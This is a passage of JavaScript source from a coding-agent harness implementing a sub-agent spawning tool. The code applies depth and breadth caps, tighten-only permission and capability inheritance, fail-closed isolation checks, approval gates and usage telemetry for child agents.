  // the breadth counter increments so spawnedCount is this-spawn-exclusive.
  if (ctx.subAgentContract) {
    try {
      const { enforceRecursionLimits } =
        await import("../lib/subagent-contract.js");
      const recur = enforceRecursionLimits({
        depth: currentDepth,
        spawnedCount: ctx.subAgentBudget?.spawned || 0,
        contract: ctx.subAgentContract,
        hardDepthCap: MAX_SUB_AGENT_DEPTH,
        hardChildrenCap: ctx.subAgentBudget?.max ?? MAX_SUB_AGENTS_PER_RUN,
      });
      if (!recur.ok) return { error: `spawn_sub_agent: ${recur.reason}` };
    } catch (err) {
      return {
        error: `spawn_sub_agent: parent contract enforcement failed closed (${err.message}).`,
      };
    }
  }
  // Breadth cap: a shared counter (one object for the whole tree) bounds the
  // TOTAL sub-agents a run may spawn, so a wide fan-out can't blow up even
  // within the depth limit. Refuse + count BEFORE any work so the increment
  // can't be skipped by a later error.
  const subAgentBudget = ctx.subAgentBudget || null;
  if (subAgentBudget) {
    const max = Number.isFinite(subAgentBudget.max)
      ? subAgentBudget.max
      : MAX_SUB_AGENTS_PER_RUN;
    if ((subAgentBudget.spawned || 0) >= max) {
      return {
        error: `spawn_sub_agent: max sub-agents per run (${max}) reached — complete remaining work directly instead of delegating further.`,
      };
    }
    subAgentBudget.spawned = (subAgentBudget.spawned || 0) + 1;
  }
  let {
    role,
    task,
    context: inheritedContext,
    contextMode,
    tools: explicitTools,
    profile: profileName,
  } = args;
  // Compatibility bridge for callers that used the original overloaded
  // `context: fresh|fork` authority spelling. An explicit `contextMode` always
  // wins and makes `context` unambiguously prompt text.
  const legacyContextMode =
    contextMode == null &&
    (inheritedContext === "fresh" || inheritedContext === "fork")
      ? inheritedContext
      : null;
  if (legacyContextMode) inheritedContext = null;
  const requestedContextMode = contextMode ?? legacyContextMode;
  // Extended sub-agent contract (gap 2026-07-11 P1): per-spawn deny-list,
  // iteration cap and worktree isolation — spawn args win over the agent
  // file's frontmatter defaults.
  let disallowedTools = Array.isArray(args.disallowedTools)
    ? args.disallowedTools.filter(Boolean)
    : null;
  let subMaxTurns =
    Number.isFinite(Number(args.maxTurns)) && Number(args.maxTurns) > 0
      ? Math.floor(Number(args.maxTurns))
      : null;
  let subIsolation = args.isolation === "worktree" ? "worktree" : null;

  // Named subagent delegation (cc agents / .chainlesschain|.claude/agents/*.md):
  // load the agent's persona (its body = system prompt) + tool allow-list.
  // Explicit role/tools still win over the agent file's values.
  let mdProfile = null;
  let mdModel = null;
  let mdContract = null; // agent-file's normalized subagent contract (definition)
  let mdSparsePaths = null; // agent-file worktree sparse-checkout paths
  let mdSymlinkDirectories = null; // agent-file worktree dep-dir symlinks
  if (args.agent) {
    try {
      const { getAgent } = await import("../lib/agents.js");
      const md = getAgent(args.agent, ctx.cwd);
      if (!md) {
        return {
          error: `Unknown subagent "${args.agent}". List them with: cc agents list`,
        };
      }
      role = role || md.name;
      if (!explicitTools && Array.isArray(md.tools)) explicitTools = md.tools;
      if (!disallowedTools && Array.isArray(md.disallowedTools)) {
        disallowedTools = md.disallowedTools;
      }
      if (!subMaxTurns && md.maxTurns) subMaxTurns = md.maxTurns;
      if (!subIsolation && md.isolation === "worktree") {
        subIsolation = "worktree";
      }
      if (md.sparsePaths != null) mdSparsePaths = md.sparsePaths;
      if (md.symlinkDirectories != null) {
        mdSymlinkDirectories = md.symlinkDirectories;
      }
      if (md.model) mdModel = md.model;
      if (md.contract) mdContract = md.contract;
      if (md.systemPrompt) {
        mdProfile = { name: md.name, systemPrompt: md.systemPrompt };
      }
    } catch (err) {
      return {
        error: `Failed to load subagent "${args.agent}": ${err.message}`,
      };
    }
  }

  if (!task || (!role && !args.agent)) {
    return {
      error: "spawn_sub_agent requires 'task' and either 'role' or 'agent'",
    };
  }

  // Resolve the child's EFFECTIVE subagent contract: spawnArgs > agent-file
  // definition (mdContract) > parent ceiling (ctx.subAgentContract). The safe,
  // tighten-only fields are consumed below (isolation fail-closed, budget,
  // effort, context inheritance); this child's contract becomes the ceiling for
  // ITS own nested spawns (threaded via SubAgentContext.subAgentContract).
  let effectiveContract = null;
  let explicitContextMode = null;
  let skillAllowlist = null;
  // MCP-server + hook allow-lists for child INHERITANCE. Default `[]` = inherit
  // NONE, which equals today's behavior (a spawned child gets zero MCP tools /
  // zero Pre-PostToolUse hooks). `context: fork` resolves these to `null` (all);
  // an explicit list subsets them. See filterInherited* below.
  let mcpAllow = [];
  let hookAllow = [];
  // Was the child's permission mode EXPLICITLY driven — a `permissionMode` in the
  // spawn args / agent file, OR a NON-"default" parent ceiling from the run
  // (`--permission-mode manual|acceptEdits|…`)? Only then do we attach an
  // ApprovalGate to the child (below), so a plain default spawn stays ungated
  // = byte-identical.
  let permModeDriven = false;
  try {
    const {
      resolveSubagentContract,
      normalizeSubagentContract,
      assertValidSubagentContract,
    } = await import("../lib/subagent-contract.js");
    // `context` predates the authority contract and remains arbitrary prompt
    // text except for the narrow legacy spelling handled above. Map the
    // separate contextMode field onto the contract's canonical `context` key.
    const authorityArgs = { ...args };
    delete authorityArgs.context;
    delete authorityArgs.contextMode;
    if (requestedContextMode != null) {
      authorityArgs.context = requestedContextMode;
    }
    assertValidSubagentContract(authorityArgs);
    const spawnContract = normalizeSubagentContract(authorityArgs);
    explicitContextMode = spawnContract.context ?? mdContract?.context ?? null;
    effectiveContract = resolveSubagentContract({
      parent: ctx.subAgentContract || {},
      definition: mdContract,
      spawnArgs: spawnContract,
    });
    permModeDriven =
      spawnContract.permissionMode != null ||
      mdContract?.permissionMode != null ||
      (ctx.subAgentContract?.permissionMode != null &&
        ctx.subAgentContract.permissionMode !== "default");
    // Skill capability INTERSECT: restrict the child's skills ONLY when it was
    // explicitly driven — an explicit `skills` list (spawn args or agent file)
    // OR an explicit `context` mode. A fully-defaulted spawn stays unrestricted
    // (null) so the silent-`fresh`→[] default can never strip ALL skills from a
    // plain sub-agent. `effectiveContract.skills` already encodes the intersect
    // against the parent ceiling (tighten-only across depth).
    const skillsDriven =
      spawnContract.skills != null ||
      mdContract?.skills != null ||
      explicitContextMode != null;
    skillAllowlist = skillsDriven ? (effectiveContract.skills ?? null) : null;
    // MCP/hooks work the OTHER way from skills: their pre-inheritance default is
    // "none", so the silent-`fresh`→[] resolution IS the safe current behavior —
    // no explicit-driven guard needed. A list (or `null` on fork) opts the child
    // into inheriting the corresponding parent capabilities.
    mcpAllow = effectiveContract.mcpServers ?? null;
    hookAllow = effectiveContract.hooks ?? null;
  } catch (err) {
    return {
      error: `spawn_sub_agent: authority contract resolution failed closed (${err.message}).`,
    };
  }

  // Filter the parent loop's live MCP plumbing + settings hooks down to what the
  // child may inherit. Default `[]` → null → the spawn passes nothing, so a plain
  // sub-agent is byte-identical to before.
  let inheritedMcp = null;
  let inheritedHooks = null;
  try {
    const { filterInheritedMcp, filterInheritedHooks } =
      await import("../lib/subagent-inheritance.js");
    inheritedMcp = filterInheritedMcp(
      {
        extraToolDefinitions: ctx.extraToolDefinitions,
        externalToolDescriptors: ctx.externalToolDescriptors,
        externalToolExecutors: ctx.externalToolExecutors,
        mcpClient: ctx.mcpClient,
      },
      mcpAllow,
    );
    inheritedHooks = filterInheritedHooks(ctx.settingsHooks || null, hookAllow);
  } catch (err) {
    return {
      error: `spawn_sub_agent: capability inheritance failed closed (${err.message}).`,
    };
  }

  // Memory INHERITANCE (contract `memory` boolean, tighten-only across depth):
  // grant the child the parent's hierarchical-memory DB ONLY when the resolved
  // contract says memory:true (explicit, or context:fork from a memory-bearing
  // parent). Default (silent-`fresh`→memory:false) → no db + memoryEnabled:false
  // → no recall = today's behavior. `effectiveContract.memory` already encodes
  // the intersect (a parent that denied memory can never re-grant downstream).
  const memoryGranted = effectiveContract?.memory === true;
  const inheritedMemory =
    memoryGranted && ctx.memoryDb
      ? { db: ctx.memoryDb, permanentMemory: ctx.permanentMemory || null }
      : null;

  // Worktree isolation must FAIL CLOSED: if requested but the cwd is not a git
  // repo, refuse the spawn instead of silently running in the parent checkout.
  if (subIsolation === "worktree") {
    try {
      const { resolveIsolationFailClosed } =
        await import("../lib/subagent-contract.js");
      const { isGitRepo } = await import("../lib/git-integration.js");
      const iso = resolveIsolationFailClosed({
        requested: "worktree",
        available: isGitRepo(ctx.cwd),
      });
      if (!iso.ok) return { error: `spawn_sub_agent: ${iso.reason}` };
    } catch (err) {
      return {
        error: `spawn_sub_agent: isolation enforcement failed closed (${err.message}).`,
      };
    }
  }

  // Phase 3: resolve declarative profile if requested. Explicit tools/context
  // override profile defaults; missing fields fall back to the profile.
  let profile = null;
  if (profileName) {
    try {
      const { getSubAgentProfile } =
        await import("../lib/sub-agent-profiles.js");
      profile = getSubAgentProfile(profileName);
      if (!profile) {
        return {
          error: `Unknown sub-agent profile: "${profileName}". Valid: explorer|executor|design`,
        };
      }
    } catch (err) {
      return {
        error: `spawn_sub_agent: requested profile resolution failed closed (${err.message}).`,
      };
    }
  }

  // A named subagent's body becomes the sub-agent system prompt (via the
  // profile.systemPrompt seam) when no declarative profile was requested.
  if (!profile && mdProfile) profile = mdProfile;

  let allowedTools = Array.isArray(explicitTools)
    ? explicitTools
    : profile?.toolAllowlist || null;
  // Deny-list: subtract from the resolved allow-list; with no allow-list
  // ("all tools"), subtract from the full built-in contract set. spawn itself
  // is always denied downstream by depth/breadth caps, so no special-casing.
  if (Array.isArray(disallowedTools) && disallowedTools.length > 0) {
    const deny = new Set(disallowedTools.map((t) => String(t).trim()));
    const base = Array.isArray(allowedTools)
      ? allowedTools
      : listCodingAgentToolNames();
    allowedTools = base.filter((t) => !deny.has(t));
  }

  // A child can never regain a tool omitted from the parent's effective schema.
  // `[]` remains deny-all all the way into the child's execution-time fence.
  if (Array.isArray(ctx.effectiveAllowedToolNames)) {
    const parentCeiling = new Set(ctx.effectiveAllowedToolNames);
    const requested = Array.isArray(allowedTools)
      ? allowedTools
      : [...parentCeiling];
    allowedTools = requested.filter((tool) => parentCeiling.has(tool));
  }

  // permissionMode enforcement into the child gate. Reuses the runner's own
  // resolvers (single-sourced, no drift); best-effort so it never breaks a spawn.
  //  • `plan` → clamp to the read-only tool set (same rule as resolveEnabledTools),
  //    so a plan sub-agent physically cannot mutate anything.
  //  • confirmer threading → hand the child the mode's NON-interactive confirmer
  //    as `permissionConfirm` (governs the ask / sensitive-file / destructive-git
  //    gates) ONLY when it is the autopilot (bypassPermissions) ALLOW confirmer.
  //    Every other mode's headless child already denies implicitly (no confirmer),
  //    so we leave it unset to stay byte-identical — crucially preserving the
  //    parallel-read fast-path + IDE-diff branch, both of which key off whether a
  //    permissionConfirm is present.
  //  • ApprovalGate sessionPolicy → attach the child its OWN ApprovalGate seeded
  //    with the mode's tier (perm.sessionPolicy) and NO confirmer, so run_shell /
  //    browser_act are gated per tier headlessly: strict denies MED/HIGH, trusted
  //    denies only HIGH, autopilot allows all (CONFIRM→no-confirmer→DENY). A fresh
  //    per-child gate (never the shared singleton) means zero interference with
  //    the parent's global confirmer. Attached ONLY when the mode was explicitly
  //    driven (permModeDriven) AND the tier actually gates (non-autopilot) — a
  //    plain default spawn stays ungated = byte-identical; autopilot's gate would
  //    be a pure no-op so it is skipped.
  // `tightenPermissionMode` already stops a child EXCEEDING the parent's mode; a
  // fully-defaulted spawn (→ "default") touches neither tools nor confirmer nor gate.
  let childPermissionConfirm = null;
  let childApprovalGate = null;
  if (effectiveContract?.permissionMode) {
    try {
      const { resolvePermissionMode, resolveEnabledTools } =
        await import("./headless-runner.js");
      const perm = resolvePermissionMode(effectiveContract.permissionMode);
      if (perm.readOnly) {
        allowedTools = resolveEnabledTools({ allowedTools, readOnly: true });
      }
      // autopilot ⟺ bypassPermissions — the only mode whose headless confirmer
      // ALLOWS. Threading a deny confirmer would needlessly disable the child's
      // parallel-read fast-path, so restrict to the allow case.
      if (
        perm.sessionPolicy === "autopilot" &&
        typeof perm.confirmer === "function"
      ) {
        childPermissionConfirm = perm.confirmer;
      }
      // Dedicated, confirmer-less child ApprovalGate for the strict/trusted tiers.
      if (permModeDriven && perm.sessionPolicy !== "autopilot") {
        const { ApprovalGate } = await import("@chainlesschain/session-core");
        childApprovalGate = new ApprovalGate({
          defaultPolicy: perm.sessionPolicy,
        });
      }
    } catch (err) {
      return {
        error: `spawn_sub_agent: permission-mode enforcement failed closed (${err.message}).`,
      };
    }
  }

  // Build a structured parent handoff if the caller did not provide explicit
  // An explicit `contextMode: fresh` contract suppresses this inheritance (the
  // child starts clean); `fork` / unset keep deterministic auto-inheritance.
  let resolvedContext = inheritedContext || null;
  if (
    !resolvedContext &&
    explicitContextMode !== "fresh" &&
    Array.isArray(ctx.parentMessages)
  ) {
    resolvedContext = buildSubAgentHandoffContext(ctx.parentMessages);
  }

  // Link child to parent session so registry-scoped queries and
  // session-close cascade cleanup can find it.
  const parentSessionId = ctx.sessionId || null;
  const interaction = ctx.interaction || null;

  // settings.json SubagentStart hooks (Claude-Code parity): fire BEFORE the
  // sub-agent runs, so a policy hook can VETO the spawn (`block`) or INJECT
  // extra context that gets prepended to the child's inherited context. This is
  // the mirror of the existing SubagentStop fire (which runs after the summary
  // returns). Best-effort — a hook error never blocks the spawn.
  if (ctx.settingsHooks) {
    try {
      const startOutcome = await runObserveHooks(
        ctx.settingsHooks,
        "SubagentStart",
        {
          session_id: parentSessionId,
          role: role || args.agent || null,
          subagent_task: String(task || "").substring(0, 2000),
        },
        { cwd: ctx.cwd },
      );
      if (startOutcome.decision === "block" && startOutcome.reason) {
        return {
          error: `spawn_sub_agent blocked by SubagentStart hook: ${startOutcome.reason}`,
        };
      }
      const injected = aggregateContext(startOutcome.results);
      if (injected) {
        resolvedContext = resolvedContext
          ? `${resolvedContext}\n---\n${injected}`
          : injected;
      }
    } catch (err) {
      return {
        error: `spawn_sub_agent: SubagentStart authority hook failed closed (${err.message}).`,
      };
    }
  }

  // Inherit the parent's provider / base-url / key; a named subagent's `model:`
  // frontmatter (mdModel) overrides just the model, else keep the parent's.
  const parentLlm = ctx.llmOptions || {};
  const subLlmOptions = {
    ...parentLlm,
    model: mdModel || parentLlm.model || undefined,
    // Preserve the host's optional event channel across every nesting level.
    // It is observational only: child hooks/tools must never depend on a
    // headless consumer being connected.
    ...(interaction ? { interaction } : {}),
    // Contract `effort` is a compute hint (reasoning level), not authority —
    // forwarded to the child loop; harmless if the provider ignores it.
    ...(effectiveContract?.effort ? { effort: effectiveContract.effort } : {}),
  };

  // 用量归因: forward the child's real token usage into the parent run's sink
  // (threaded through toolContext) so agentLoop re-yields it as attributed
  // `token-usage` events. A nested child's already-attributed record passes
  // through unchanged (deepest frame wins). subCtxRef closes over the created
  // context so the frame can carry the sub-agent's id.
  const usageSink = Array.isArray(ctx.subAgentUsageSink)
    ? ctx.subAgentUsageSink
    : null;
  if (ctx.strictUsageTelemetry === true) {
    _assertStrictUsageObserver(ctx.onUsageBoundary, "boundary");
    _assertStrictUsageObserver(ctx.onUsageSettlement, "settlement");
  }
  let subCtxRef = null;
  const latchBackgroundUsageFailure = (error) => {
    if (
      error?.runtimeLedgerPersistence === true &&
      ctx.backgroundUsageFailureState &&
      !ctx.backgroundUsageFailureState.error
    ) {
      ctx.backgroundUsageFailureState.error = error;
    }
    return error;
  };
  const projectSubagentUsage = (u) =>
    u && u.attribution
      ? u
      : {
          ...u,
          ...(["model", "semantic-compaction"].includes(u?.source)
            ? { workflowRequestSource: u.source }
            : {}),
          source:
            u?.source === "semantic-compaction"
              ? "semantic-compaction"
              : "subagent",
          attribution: {
            origin: "subagent",
            subagentId: subCtxRef?.id || null,
            role: subCtxRef?.role || role || null,
            parentSessionId,
            depth: currentDepth + 1,
          },
        };
  const onUsage = usageSink
    ? (u) => {
        const forwarded = projectSubagentUsage(u);
        try {
          usageSink.push(forwarded);
        } catch (error) {
          if (ctx.strictUsageTelemetry === true) {
            throw _runtimeUsageBoundaryFailure(
              error,
              "CC_USAGE_FORWARDING_FAILED",
              "Sub-agent usage forwarding failed",
            );
          }
        }
      }
    : null;
  const observeSubagentBoundary =
    ctx.strictUsageTelemetry === true
      ? (event) => {
          try {
            return _notifyStrictUsageBoundary(
              ctx.onUsageBoundary,
              projectSubagentUsage(event),
            );
          } catch (error) {
            throw latchBackgroundUsageFailure(error);
          }
        }
      : null;
  const observeSubagentSettlement =
    ctx.strictUsageTelemetry === true
      ? (event) => {
          try {
            return _notifyStrictUsageSettlement(
              ctx.onUsageSettlement,
              projectSubagentUsage(event),
            );
          } catch (error) {
            throw latchBackgroundUsageFailure(error);
          }
        }
      : null;
  const observeSubagentReceipt =
    ctx.strictUsageTelemetry === true &&
    typeof ctx.onProviderReceipt === "function"
      ? (event) => {
          try {
            return _notifyStrictProviderReceipt(
              ctx.onProviderReceipt,
              projectSubagentUsage(event),
            );
          } catch (error) {
            throw latchBackgroundUsageFailure(error);
          }
        }
      : null;
  const projectSubagentTool = (event) => ({
    ...event,
    attribution:
      event?.attribution || projectSubagentUsage({}).attribution || null,
  });
  const observeSubagentToolBoundary =
    ctx.strictUsageTelemetry === true
      ? (event) => {
          try {
            return _notifyStrictToolObserver(
              ctx.onToolCallBoundary,
              projectSubagentTool(event),
              "boundary",
            );
          } catch (error) {
            throw latchBackgroundUsageFailure(error);
          }
        }
      : null;
  const observeSubagentToolSettlement =
    ctx.strictUsageTelemetry === true
      ? (event) => {
          try {
            return _notifyStrictToolObserver(
              ctx.onToolCallSettlement,
              projectSubagentTool(event),
              "settlement",
            );
          } catch (error) {
            throw latchBackgroundUsageFailure(error);
          }
        }
      : null;
  if (typeof parentLlm.onStreamRetry === "function") {
    subLlmOptions.onStreamRetry = (attempt, error, telemetry = {}) => {
      try {
        return _notifyStrictRetryObserver(parentLlm.onStreamRetry, [
          attempt,
          error,
          projectSubagentUsage(telemetry),
        ]);
      } catch (observerError) {
        throw latchBackgroundUsageFailure(observerError);
      }
    };
  }

  // Worktree sparse-checkout + dependency symlink (large-monorepo lever): when
  // the child runs in an isolated worktree, only materialize the packages it
  // needs (sparsePaths) and reuse approved dep dirs (e.g. node_modules) from the
  // main checkout (symlinkDirectories). Mirrors the team-worktree passthrough;
  // spawn args win over the agent-file's values. Resolved ONLY when isolation is
  // on → absent for a non-worktree spawn = byte-identical (full checkout).
  let subWorktreeOptions = null;
  if (subIsolation === "worktree") {
    try {
      const { normalizeSparsePaths } =
        await import("../lib/worktree-sparse.js");
      const sparse = normalizeSparsePaths(
        args.sparsePaths ?? mdSparsePaths ?? null,
      );
      const symlink = args.symlinkDirectories ?? mdSymlinkDirectories ?? null;
      const wtOpts = {};
      if (sparse) wtOpts.sparsePaths = sparse;
      if (symlink != null) wtOpts.symlinkDirectories = symlink;
      if (Object.keys(wtOpts).length) subWorktreeOptions = wtOpts;
    } catch (err) {
      return {
        error: `spawn_sub_agent: worktree scope resolution failed closed (${err.message}).`,
      };
    }
  }

  // Preserve host deny/policy metadata, but do not implicitly inherit hosted
  // external definitions. MCP/host capabilities enter the child only through
  // the explicit contract-filtered plumbing above.
  const childHostManagedToolPolicy = ctx.hostManagedToolPolicy
    ? { ...ctx.hostManagedToolPolicy, toolDefinitions: [] }
    : null;
  // A parent gate is already an authority ceiling. Prefer it over a newly
  // derived child gate so an explicit child mode can never relax the parent.
  const effectiveChildApprovalGate = ctx.approvalGate || childApprovalGate;

  const subCtx = SubAgentContext.create({
    role,
    task,
    parentId: parentSessionId,
    // Hook-envelope tracing: the child loop stamps its own runId as trace_id
    // and THIS run's id as parent_id on every settings-hook payload it fires.
    hookParentTraceId: ctx.hookTraceId || null,
    inheritedContext: resolvedContext,
    allowedTools: allowedTools ?? null,
    cwd: ctx.cwd,
    profile: profile || null,
    llmOptions: subLlmOptions,
    ...(ctx.strictUsageTelemetry === true && ctx.workflowChildEffectId
      ? { workflowEffectId: ctx.workflowChildEffectId }
      : {}),
    depth: currentDepth + 1, // nested spawns see their own level
    // Same shared counter object so the child's own spawns draw from the run's
    // single total-sub-agent pool (breadth cap spans the whole tree).
    subAgentBudget: ctx.subAgentBudget || null,
    ...(ctx.sessionBudget ? { sessionBudget: ctx.sessionBudget } : {}),
    ...(ctx.hostResourceBudget
      ? { hostResourceBudget: ctx.hostResourceBudget }
      : {}),
    onUsage,
    ...(interaction && typeof interaction.emit === "function"
      ? {
          onProgress: (progress) =>
            emit("sub-agent.progress", {
              event_type: progress?.type || "unknown",
              tool: progress?.tool || null,
              iteration_count: progress?.iterationCount || 0,
              token_count: progress?.tokenCount || 0,
            }),
        }
      : {}),
    ...(ctx.strictUsageTelemetry === true
      ? {
          strictUsageTelemetry: true,
          onUsageBoundary: observeSubagentBoundary,
          onUsageSettlement: observeSubagentSettlement,
          ...(observeSubagentReceipt
            ? { onProviderReceipt: observeSubagentReceipt }
            : {}),
          onToolCallBoundary: observeSubagentToolBoundary,
          onToolCallSettlement: observeSubagentToolSettlement,
        }
      : {}),
    // Extended contract (gap 2026-07-11): per-agent iteration cap + opt-in
    // worktree isolation. undefined keeps the profile/flag defaults intact.
    ...(subMaxTurns ? { maxIterations: subMaxTurns } : {}),
    ...(subIsolation === "worktree" ? { useWorktree: true } : {}),
    // Worktree sparse-checkout / dep-symlink options (large-monorepo); only
    // present for a worktree spawn that requested them (else full checkout).
    ...(subWorktreeOptions ? { worktreeOptions: subWorktreeOptions } : {}),
    // Resolved contract (gap 2026-07-12): cap the child's token budget and hand
    // it its EFFECTIVE contract so its OWN spawns inherit this ceiling.
    ...(effectiveContract?.budget?.tokens
      ? { tokenBudget: effectiveContract.budget.tokens }
      : {}),
    ...(effectiveContract ? { subAgentContract: effectiveContract } : {}),
    // Skill capability INTERSECT (2026-07-12): a non-null allow-list (possibly
    // empty) restricts run_skill/list_skills in the child loop.
    ...(skillAllowlist != null ? { skillAllowlist } : {}),
    // MCP + hook capability INHERITANCE (2026-07-12): only non-null when the
    // contract opted the child into inheriting (context:fork or an explicit
    // list). filterInherited* already subset these to the allowed servers /
    // matchers. Absent → child inherits neither (today's default).
    ...(inheritedMcp
      ? {
          extraToolDefinitions: inheritedMcp.extraToolDefinitions,
          externalToolDescriptors: inheritedMcp.externalToolDescriptors,
          externalToolExecutors: inheritedMcp.externalToolExecutors,
          mcpClient: inheritedMcp.mcpClient,
          mcpHostClient: ctx.mcpHostClient || inheritedMcp.mcpClient,
          ...(ctx.mcpCallLedger ? { mcpCallLedger: ctx.mcpCallLedger } : {}),
          ...(ctx.mcpConflictScheduler
            ? { mcpConflictScheduler: ctx.mcpConflictScheduler }
            : {}),
          ...(ctx.mcpDispatchAdmission
            ? { mcpDispatchAdmission: ctx.mcpDispatchAdmission }
            : {}),
        }
      : {}),
    ...(inheritedHooks ? { settingsHooks: inheritedHooks } : {}),
    // Memory INHERITANCE (2026-07-12): grant the child the parent's memory DB
    // (namespaced by the child's task id) only when the contract allows; else
    // memoryEnabled:false hard-suppresses recall even if a db leaks through.
    ...(inheritedMemory
      ? {
          db: inheritedMemory.db,
          permanentMemory: inheritedMemory.permanentMemory,
          memoryEnabled: true,
        }
      : { memoryEnabled: false }),
    // permissionMode confirmer (2026-07-12): only set for the autopilot (bypass)
    // ALLOW confirmer; absent for every other mode so the child stays
    // implicitly-deny + byte-identical (parallel-read fast-path preserved).
    ...(childPermissionConfirm
      ? { permissionConfirm: childPermissionConfirm }
      : {}),
    // permissionMode ApprovalGate (2026-07-13): a dedicated confirmer-less gate
    // seeded with the mode's tier gates the child's run_shell / browser_act;
    // absent (ungated) for a plain default spawn = byte-identical.
    ...(effectiveChildApprovalGate
      ? { approvalGate: effectiveChildApprovalGate }
      : {}),
    // Parent execution authority is inherited as a tighten-only bundle and is
    // re-enforced by the child's executeTool path on every provider tool call.
    ...(ctx.permissionRules ? { permissionRules: ctx.permissionRules } : {}),
    ...(ctx.permissionRulesProvider
      ? { permissionRulesProvider: ctx.permissionRulesProvider }
      : {}),
    ...(childHostManagedToolPolicy
      ? { hostManagedToolPolicy: childHostManagedToolPolicy }
      : {}),
    ...(ctx.planManager ? { planManager: ctx.planManager } : {}),
    ...(ctx.sandbox ? { sandbox: ctx.sandbox } : {}),
    ...(Array.isArray(ctx.additionalDirectories)
      ? { additionalDirectories: [...ctx.additionalDirectories] }
      : {}),
    ...(ctx.shellPolicyOverrides
      ? { shellPolicyOverrides: ctx.shellPolicyOverrides }
      : {}),
    ...(ctx.classifyAllShell ? { classifyAllShell: true } : {}),
    ...(ctx.unattendedActionPolicy
      ? { unattendedActionPolicy: ctx.unattendedActionPolicy }
      : {}),
    ...(ctx.toolAdmission ? { toolAdmission: ctx.toolAdmission } : {}),
  });
  subCtxRef = subCtx;

  const emit = (type, payload) => {
    if (type === "sub-agent.started") {
      emitHooksV2Event("TaskCreated", {
        task_id: subCtx.id,
        session_id: parentSessionId,
        role: subCtx.role,
        task: subCtx.task,
        background: payload?.background === true,
      });
    } else if (type === "sub-agent.completed" || type === "sub-agent.failed") {
      emitHooksV2Event("TaskCompleted", {
        task_id: subCtx.id,
        session_id: parentSessionId,
        role: subCtx.role,
        status: type === "sub-agent.failed" ? "failed" : "completed",
        error: payload?.error || null,
        completed_at: payload?.completedAt || null,
      });
    }
    if (!interaction || typeof interaction.emit !== "function") return;
    try {
      interaction.emit(type, {
        sessionId: parentSessionId,
        subAgentId: subCtx.id,
        parentSessionId,
        role: subCtx.role,
        ...payload,
      });
    } catch (_err) {
      // Event emission is best-effort — never break the tool call
    }
  };

  // Resolve the registry ONCE before the try so the failure path can also move
  // the sub-agent out of `_active` (the success path does this via complete()).
  const { SubAgentRegistry } =
    await import("../lib/sub-agent-registry.js").catch(() => ({
      SubAgentRegistry: null,
    }));
  let registry = null;
  if (SubAgentRegistry) {
    try {
      registry = SubAgentRegistry.getInstance();
    } catch (_err) {
      registry = null; // registry unavailable — non-critical
    }
  }

  // ── Background mode (Claude-Code 2.1.198 parity) ────────────────────────
  // Return a running handle immediately; the parent loop keeps working and
  // drains the result into the conversation when it settles (agentLoop also
  // refuses to finish while any background sub-agent is still running). Only
  // available when the calling loop provided the per-run map — a bare
  // executeTool() without it falls through to the blocking path.
  //
  // `background` is driven by the resolved contract (spawn arg > agent-file
  // definition), so an agent-file can declare `background: true` and be spawned
  // detached without the caller passing it. `effectiveContract.background`
  // already folds in `args.background`; the explicit OR keeps the path
  // byte-identical if contract resolution was skipped (effectiveContract null).
  const wantsBackground =
    args.background === true || effectiveContract?.background === true;
  if (wantsBackground && ctx.backgroundSubAgents instanceof Map) {
    // Cancel with the parent: forward the loop's abort signal so killing the
    // run doesn't orphan a detached child mid-LLM-call.
    subCtx._signal = subCtx._signal || ctx.signal || null;
    if (registry) {
      try {
        registry.register(subCtx);
      } catch (_err) {
        // Registry not available — non-critical
      }
    }
    emit("sub-agent.started", {
      task: subCtx.task,
      background: true,
      allowedTools: allowedTools ?? null,
      maxIterations: subCtx.maxIterations,
      createdAt: subCtx.createdAt,
    });
    const entry = {
      id: subCtx.id,
      role: subCtx.role,
      task: subCtx.task,
      settled: false,
      outcome: null,
      hookFeedback: null,
      promise: null,
      recoveryBinding: () =>
        subCtx.recoveryBinding(entry.outcome?.result || null),
    };
    // Settle-capture wrapper: the stored promise NEVER rejects, so an
    // unconsumed handle can't surface as an unhandled rejection.
    entry.promise = subCtx
      .run(task)
      .then(
        (result) => ({ result, error: null }),
        (err) => {
          subCtx.forceComplete(err.message);
          return {
            result: subCtx.result,
            error: err.message,
            ...(err?.runtimeLedgerPersistence === true ||
            err?.workflowEffectOutcomeUnknown === true
              ? { fatalError: err }
              : {}),
          };
        },
      )
      .then((outcome) => {
        entry.settled = true;
        entry.outcome = outcome;
        if (registry) {
          try {
            registry.complete(subCtx.id, outcome.result);
          } catch (_err) {
            // Non-critical
          }
        }
        emit(outcome.error ? "sub-agent.failed" : "sub-agent.completed", {
          status: subCtx.status,
          background: true,
          ...(outcome.error
            ? { error: outcome.error }
            : {
                summary: outcome.result?.summary,
                toolsUsed: outcome.result?.toolsUsed,
                iterationCount: outcome.result?.iterationCount,
                tokenCount: outcome.result?.tokenCount,
                artifactCount: outcome.result?.artifacts?.length || 0,
              }),
          completedAt: subCtx.completedAt,
        });
        return outcome;
      });
    ctx.backgroundSubAgents.set(subCtx.id, entry);
    return {
      success: true,
      background: true,
      status: "running",
      subAgentId: subCtx.id,
      role: subCtx.role,
      parentSessionId,
      childBinding: subCtx.recoveryBinding(),
      note: "Sub-agent is running in the background. Its result will be delivered to you automatically in a later turn — continue with other work; the run will not finish before the result arrives.",
    };
  }

  try {
    // Notify registry if available
    if (registry) {
      try {
        registry.register(subCtx);
      } catch (_err) {
        // Registry not available — non-critical
      }
    }

    emit("sub-agent.started", {
      task: subCtx.task,
      allowedTools: allowedTools ?? null,
      maxIterations: subCtx.maxIterations,
      createdAt: subCtx.createdAt,
    });

    const result = await subCtx.run(task);

    // Complete in registry
    if (registry) {
      try {
        registry.complete(subCtx.id, result);
      } catch (_err) {
        // Non-critical
      }
    }

    if (result?.budgetReason) {
      emit("sub-agent.failed", {
        status: subCtx.status,
        error: result.summary,
        budgetReason: result.budgetReason,
        completedAt: subCtx.completedAt,
      });
      return {
        error: result.summary,
        code: "ERR_SESSION_RESOURCE_BUDGET",
        budgetReason: result.budgetReason,
        subAgentId: subCtx.id,
        role: subCtx.role,
        parentSessionId,
        childBinding: subCtx.recoveryBinding(result),
      };
    }

    emit("sub-agent.completed", {
      status: subCtx.status,
      summary: result.summary,
      toolsUsed: result.toolsUsed,
      iterationCount: result.iterationCount,
      tokenCount: result.tokenCount,
      artifactCount: result.artifacts.length,
      completedAt: subCtx.completedAt,
    });

    return {
      success: true,
      subAgentId: subCtx.id,
      role: subCtx.role,
      parentSessionId,
      childBinding: subCtx.recoveryBinding(result),
      summary: result.summary,
      toolsUsed: result.toolsUsed,
      iterationCount: result.iterationCount,
